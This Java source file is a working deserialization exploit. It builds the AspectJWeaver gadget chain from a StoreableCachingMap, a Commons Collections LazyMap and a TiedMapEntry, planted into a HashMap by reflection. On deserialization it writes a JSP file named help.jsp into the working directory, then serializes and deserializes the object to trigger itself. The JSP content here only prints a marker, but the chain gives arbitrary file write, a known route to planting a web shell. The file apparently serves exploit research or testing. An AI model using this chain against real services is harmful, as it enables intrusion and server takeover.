package aspect;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.utils;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class aspect {
    public static Object getObject() throws Exception{
        Class aspectJWeaver = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor ctor = aspectJWeaver.getDeclaredConstructor(String.class, int.class);
        ctor.setAccessible(true);
        Object obj = ctor.newInstance("./",2);

        Transformer transformer = new ConstantTransformer("<% out.println(\"jsp1234568\");%>".getBytes(StandardCharsets.UTF_8));

        Map lazyMap = LazyMap.decorate((Map)obj, transformer);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "help.jsp");

        HashMap hashMap = new HashMap();
        hashMap.put("foo", "a");

        Field field = HashMap.class.getDeclaredField("table");
        field.setAccessible(true);

        Object[] array = (Object[]) field.get(hashMap);
        int a = 0;
        for(int i=0;i<array.length;i++)
            if(array[i]!=null)
                a=i;
        Object node = array[a];
        Field keyField = node.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(node, entry);

        return hashMap;
    }
    public static void main(String[] args) throws Exception {

        Object hashSet = getObject();

        byte[] ser = utils.serialize(hashSet);
        utils.unserialize(ser);
    }

}
